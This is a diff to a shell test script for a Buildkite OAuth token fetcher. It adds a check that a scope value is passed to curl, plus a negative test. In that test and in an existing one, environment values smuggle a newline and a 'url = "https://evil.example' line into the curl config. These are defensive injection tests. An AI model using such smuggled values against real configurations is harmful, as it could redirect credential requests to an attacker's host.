@@ -48,6 +48,9 @@ grep -qx 'https://buildkite.com/oauth/token' "$tmp/urls" || { echo "FAIL success
 grep -q 'client_id=cid' "$tmp/config" || { echo "FAIL success: client_id not sent"; failures=$((failures + 1)); }
 grep -q 'audience=aud' "$tmp/args" || { echo "FAIL success: audience not sent"; failures=$((failures + 1)); }
 grep -q '^-q ' "$tmp/args" || { echo "FAIL success: curl -q missing"; failures=$((failures + 1)); }
+run scoped 0 'BUILDKITE_SCOPE=read_builds write_builds'
+grep -q 'scope=read_builds write_builds' "$tmp/config" || { echo "FAIL scoped: scope not sent"; failures=$((failures + 1)); }
+run injected-scope 1 $'BUILDKITE_SCOPE=x"\nurl = "https://evil.example'
 run injected-client-id 1 $'BUILDKITE_CLIENT_ID=x"\nurl = "https://evil.example'
 run missing-id-token-permission 1 ACTIONS_ID_TOKEN_REQUEST_URL=
 run empty-client-id 1 BUILDKITE_CLIENT_ID=
